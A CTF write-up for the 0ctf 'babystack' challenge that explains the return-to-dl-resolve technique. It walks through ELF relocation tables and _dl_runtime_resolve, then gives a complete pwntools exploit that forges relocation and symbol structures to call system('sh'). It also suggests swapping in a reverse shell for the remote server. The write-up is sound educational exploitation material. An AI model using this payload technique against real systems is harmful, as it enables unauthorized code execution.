# 0ctf babystack with return-to dl-resolve
In this write-up I will discuss how I managed to solve the challenge "babystack" from 0ctf with a technique called return to dl-resolve. I did not know this kind of return-to attack before the contest. In the following sections a detailed explanation of the entire exploit will be presented.
## 1. Binary analysis
I downloaded the provided binary [babystack](./babystack) and quickly fired up binaryninja alongside with gdb to analyze it. I quickly realized a buffer overflow vulnerability is present within <code>sub_804843b</code>.
My first approach was to solve this challenge using a return-to-libc attack by leaking the base address of the library and call system in order to get a shell. <br>
This technique is contingent on:
1. Leaking libc base address
2. Knowing the version of libc to get the offset of <code>system</code>.

However, the version of libc on the remote server was unknown and the ELF did not provide any function that can be used to leak addresses.
To put it another way, without any of the two requirements fulfilled, return-to libc is not suitable for this scenario.


```asm
sub_804843b:
push    ebp
mov     ebp, esp
sub     esp, 0x28 {var_2c}
sub     esp, 0x4 {var_30}
push    0x40
lea     eax, [ebp-0x28 {var_2c}]
push    eax
push    0x0
call    read # read(0, ebp-0x28, 0x40) buffer overflow :)
add     esp, 0x10 {var_2c}
nop     
leave    {__saved_ebp}
retn    
```
## 2. Overview of the problem:
- <b> 32-bit </b>
- <b> ASLR, NX, Partial RELRO, NO PIE </b>
- <b> Unknown libc version</b>
- <b> Missing a way to leak (print) data </b>

At this point, I had no idea of how to exploit the binary.
After "googling" for a while I came across this interesting phrack article[1] and numerous write-ups in chinese about the return2-dl-resolve technique[2].
Considering the lack of documentation for this particular return-to attack and its remarkable use in binary exploitation, I have decided to write this article to clarify the underneath of this technique and to walk you through the stages of crafting a properly working payload.
## 3. ELF relocation 
A given ELF object defines some symbols and imports/uses some others. The dynamic linker needs to connect those references by placing the value of the symbols (the effective address of the referenced variable/function) where the ELF object expects to find it. This process of resolving the symbol references is called relocation [3].
Lazy binding (relocation at runtime) of imported symbols happens during the first call of the function using the well-known PLT and GOT sections [4][5][6].

```sh
gdb-peda$ x/3i $eip
=> 0x8048300 <read@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048306 <read@plt+6>:	push   0x0
   0x804830b <read@plt+11>:	jmp    0x80482f0
gdb-peda$ x/1wx 0x804a00c
0x804a00c:	0x08048306
```
During relocation of any function symbol, IP will jump to PLT and try to resolve the symbol. As presented above, the process is quite straightforward: a value is pushed to the stack and some kind of "resolver" is called (0x80482f0).
The resolved address will be given from the GOT entry for any further call to the function and the IP will be directly jump to the epilogue of the subroutine.
The purpose of our attack is to resolve any function symbol from libc at runtime even if our ELF object does not import it.


## 4. Background knowledge
The .dynamic section of the ELF file contains information used by ld.so to resolve the symbols at runtime.
```sh
# readelf -d ./babystack

Dynamic section at offset 0xf14 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x80482c8
 0x0000000d (FINI)                       0x80484f4
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804822c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      80 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482b0
 0x00000011 (REL)                        0x80482a8
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048288
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x804827c
 0x00000000 (NULL)                       0x0

```
We will focus on SYMTAB, STRTAB, and JMPREL.
### _<b>4.1 JMPREL</b>_

JMPREL segment (corresponds to 'rel.plt') stores a table called ```Relocation table```. Each entry maps to a symbol.
```sh
# readelf -r ./babystack

Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

The type of these entries is ```Elf32_Rel```, which is defined as it follows. The size of one entry is 8 bytes.

```C
typedef uint32_t Elf32_Addr ; 
typedef uint32_t Elf32_Word ; 
typedef struct 
{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel ; 
#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
```

Let's take a look at the first entry of our table:
-  The column Name gives the name of our symbol: ```read@GLIBC_2.0```;
-  Offset is the address of the GOT entry for the symbol: ```0x0804a00c```;
-  Info stores additional metadata such as ```ELF32_R_SYM``` or ```ELF32_R_TYPE```;

According to the defined MACROS, ```ELF32_R_SYM(r_info) == 1``` and  ```ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)```.
Keep in mind that ```R_SYM``` is 1. We will use this later.

### _<b>4.2 STRTAB</b>_ 
STRTAB is a simple table that stores the strings for symbols name.
``` 
gdb-peda$ x/10s 0x804822c
0x804822c:	""
0x804822d:	"libc.so.6"
0x8048237:	"_IO_stdin_used"
0x8048246:	"read"
0x804824b:	"alarm"
0x8048251:	"__libc_start_main"
0x8048263:	"__gmon_start__"
0x8048272:	"GLIBC_2.0"
```

### _<b>4.3 SYMTAB</b>_
This table holds relevant symbol information. Each entry is a  ```Elf32_Sym``` structure and its size is 16 bytes.

```C
typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
```
The first field, ```st_name```, gives the offset in ```STRTAB``` where the name of the symbol begins.
The other fields of this structure are not used in the exploit, so I will not cover them.
The ```ELF32_R_SYM(r_info) == 1``` variable (which we got from the JMPREL table) gives the index of the Elf32\_Sym in SYMTAB for the specified symbol.
In this particular case, index is 1. Let's analyze this entry.  

```c
gdb-peda$ x/4wx 0x80481cc + 1 * 16 // (SYMTAB + index*sizeof(entry)) where index = ELF32_R_SYM(r_info)
0x80481dc:	0x0000001a	0x00000000	0x00000000	0x00000012 
                    |_____
                          |
gdb-peda$ x/1s 0x804822c+0x1a // (STRTAB + st_name)
0x8048246:	"read"
gdb-peda$ 
```
Adding the first 4 bytes from elf32_sym to STRTAB gives the address of the symbol name.

# 5. _dl_runtime_resolve
With the concepts of ```JMPREL```, ```SYMTAB``` and ```STRTAB``` in mind, let's break down how resolving symbols works.
```c
gdb-peda$ x/3i $eip
=> 0x8048300 <read@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048306 <read@plt+6>:	push   0x0
   0x804830b <read@plt+11>:	jmp    0x80482f0
gdb-peda$ x/1xw 0x804a00c
0x804a00c:	0x08048306
gdb-peda$ x/2i 0x80482f0
   0x80482f0:	push   DWORD PTR ds:0x804a004
   0x80482f6:	jmp    DWORD PTR ds:0x804a008
gdb-peda$ 
```
1. The program reads the GOT value from (0x804a00c) and jumps back into the PLT section.
2. Push the parameter 0x0 to the stack.
3. Push extra parameter and jumps to resolver.

The process specified above is equivalent to the following function call:<br>
```_dl_runtime_resolve ( link_map , rel_offset )```<br>
The rel_offset gives the offset of the ```Elf32_Rel``` in JMPREL table. ```Link_map (0x804a004)``` is nothing but a list with all the loaded libraries. ```_dl_runtime_resolve``` uses this list to resolve the symbol.
After relocating the symbol and its entry in SYMTAB populated, the initial call of read will be invoked.
The pseudocode  below summarize the process described until now:
```C
// call of unresolved read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {
    Elf32_Rel *rel_entry = JMPREL + rel_offset ;
    Elf32_Sym *sym_entry = &SYMTAB [ ELF32_R_SYM ( rel_entry -> r_info )];
    char *sym_name = STRTAB + sym_entry -> st_name ;
    _search_for_symbol_(link_map, sym_name);
    // invoke initial read call now that symbol is resolved
    read(0, buf, 0x100);
}
```
# 6. Exploit
Now that we have covered the principle behind lazy binding, we can start crafting the exploit.
You may have already noticed that bounds checks are missing. Thus, the main idea is to provide
a big ```rel_offset``` such that the ```rel_entry``` to be found within our controllable area. 
We can craft forged structures for ```Elf32_Rel``` and ```Elf32_Sym``` that will force the ```_dl_runtime_resolve``` to bind the ```system``` function symbol.
The key is that the index of the corresponding pseudo-entry should be calculated correctly.
It is important not to forget that our function will be called after being resolved, so the parameter for the ```system``` function should already be on the stack before calling the resolver.

For **demonstration purposes only**, let us suppose that:
* JMPREL @ ```0x0```
* SYMTAB @ ```0x100```
* STRTAB @ ```0x200```
* controllable area @ ```0x300```

We need to craft our ```Elf32_Rel``` and ```Elf32_Sym``` somewhere within the controllable area and provide a ```rel_offset``` such that the resolver reads our special forged structures.
Let's suppose that the controllable (stack after pivotation ??? ) are has the following layout.
```
             +--------+
r_offset     |GOT     |  0x300     
r_info       |0x2100  |  0x304
alignment    |AAAAAAAA|  0x308
st_name      |0x120   |  0x310
st_value     |0x0     |
st_size      |0x0     |
others       |0x12    |
sym_string   |"syst   |  0x320
             |em\x00" |
             +--------+
```
When ```_dl_runtime_resolve ( link_map , 0x300)``` is called, the 0x300 offset is used to get the ```Elf32_Rel* rel = JMPREL + 0x300 == 0x300.```<br>
Secondly, the Elf32_Sym is accessed using the ```r_info``` field from 0x304. ``` Elf32_Sym* sym = &SYMTAB[(0x2100 >> 8)] == 0x310.```<br>
The last step is to compute the address of the symbol string. This is done by adding ```st_name``` to ```STRTAB``` : ``` const char *name = STRTAB + 0x120 == 0x320```.<br>
Note that SYMTAB access its entries as an array, therefore ELF32_sym should be aligned to 0x10 bytes.
Now that we control st_name, we can basically force the resolver to relocate  ```system``` and call ```system('sh') ``` to a own the system :)<br>
Writing the payload should be easy now that we have a clear image of the forged memory layout.

# 7. Payload
```python
from pwn import *
r = process("./babystack")
_elf = ELF("./babystack")
resolver = 0x80482F0    #push link_map and call dl_resolve
buf = 0x804af00         #controllable area (.bss)
leave_ret = 0x8048455   #gadget
SYMTAB = 0x080481cc
STRTAB = 0x0804822c
JMPREL = 0x080482b0

# Pivoting the stack and calling read(0, buf, 0x80) for the rest of the payload
buffer = ""
buffer += "A"*40
buffer += p32(buf)   #stack pivoting. (esp = buff)
buffer += p32(_elf.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) 

# Compute offsets and forged structures
forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 #size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7 

elf32_rel = p32(_elf.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

# Rest of the payload: dl-resolve hack :) (the real deal)
buffer2 = 'AAAA'                #fake ebp
buffer2 += p32(resolver)        # ret-to dl_resolve
buffer2 += p32(rel_offset)      #JMPRL + offset = struct
buffer2 += 'AAAA'               #fake return 
buffer2 += p32(buf+100)         # system parameter
buffer2 += elf32_rel            # (buf+0x14)
buffer2 += 'A' * align
buffer2 += elf32_sym_struct     # (buf+0x20)
buffer2 += "system\x00"
p = (100 - len(buffer2))
buffer2 += 'A' * p              #padding
buffer2 += "sh\x00"
p = (0x80 - len(buffer2))
buffer2 += "A" * p              #total read size

r.send(buffer + buffer2)
r.interactive()
```

```sh
# python exploit_my.py
[+] Starting local process './babystack': pid 1987
[*] '/root/CTF/0ctf/babystack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ whoami
root
$  
```
Awesome! We have successfully exploited this binary on our local machine.
However, this payload wil not work for the remote babystack service because whose stdout redirected to /dev/null.
To get the flag, change the "sh" command with a reverse shell command, send the new payload to the remote server and wait for the vulnerable machine to connect back to your host and open shell.


# 8. Conclusion
All things consider, return-to dl-resolve is one of the most interesting techniques I have ever used because neither libc remote version nor leaking addresses is required to call functions not imported by the elf explicitly.   
Despite the fact that  additional gadgets and address leaks are still required on 64-bit environment, the principle is the same.
To automate the payload crafting process easier, roputils library from inaz2 can be used. This great tool has support for various return-to techniques, including the one described in this article [7].
Should you have any questions or remarks, please contact me: ricardoungureanu@gmail.com

>[Link writeup] https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62

<hr>
[1] http://phrack.org/issues/58/4.html<br>
[2] http://rk700.github.io/2015/08/09/return-to-dl-resolve/ <br>
[3] http://www.gabriel.urdhr.fr/2015/01/22/elf-linking/<br>
[4] https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html<br>
[5] https://manybutfinite.com/post/anatomy-of-a-program-in-memory/ <br>
[6] https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter3-7.html<br>
[7] https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py <br>
